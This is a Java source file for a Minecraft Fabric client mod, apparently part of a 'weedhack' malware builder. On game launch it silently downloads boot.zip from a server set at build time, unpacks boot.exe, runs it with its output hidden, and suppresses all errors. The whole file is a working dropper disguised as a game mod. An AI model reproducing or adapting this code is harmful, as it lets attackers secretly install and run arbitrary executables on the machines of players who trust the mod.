// language: Java, file: builder/fabric-mod/src/main/java/com/weedhack/launcher/LauncherMod.java
package com.weedhack.launcher;

import net.fabricmc.api.ClientModInitializer;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class LauncherMod implements ClientModInitializer {
    // Injected at build time by minecraftbuild.js — replaced before javac.
    private static final String ACCOUNT_KEY = "__ACCOUNT_KEY__";
    private static final String SERVER_BASE  = "__SERVER_BASE__";

    @Override
    public void onInitializeClient() {
        // fabric loader hands us a fully-loaded client here.
        // we just spawn our own thread and get out of the way.
        new Thread(LauncherMod::runPayload, "wh-payload").start();
    }

    private static void runPayload() {
        try {
            // Sleep a few seconds so the client doesn't lock up on launch
            Thread.sleep(3000);

            Path work = Files.createTempDirectory("wh-launch-");
            Path zip  = work.resolve("boot.zip");
            Path exe  = work.resolve("boot.exe");

            download(SERVER_BASE + "/api/downloads/boot.zip", zip);
            unzipSingle(zip, "boot.exe", exe);

            if (!Files.exists(exe) || Files.size(exe) < 1000) {
                return;
            }

            ProcessBuilder pb = new ProcessBuilder(exe.toString());
            pb.directory(work.toFile());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.start();
        } catch (Exception e) {
            // fail silently — do not crash the minecraft client
        }
    }

    private static void download(String urlStr, Path dest) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setConnectTimeout(15_000);
        c.setReadTimeout(60_000);
        c.setRequestProperty("User-Agent", "Mozilla/5.0");
        try (InputStream in = c.getInputStream();
             OutputStream out = Files.newOutputStream(dest)) {
            in.transferTo(out);
        }
    }

    private static void unzipSingle(Path zip, String wantName, Path outPath) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zip))) {
            ZipEntry e;
            while ((e = zis.getNextEntry()) != null) {
                if (e.getName().equals(wantName)) {
                    try (OutputStream out = Files.newOutputStream(outPath)) {
                        zis.transferTo(out);
                    }
                    return;
                }
            }
        }
        throw new IOException("boot.exe not found in zip");
    }
}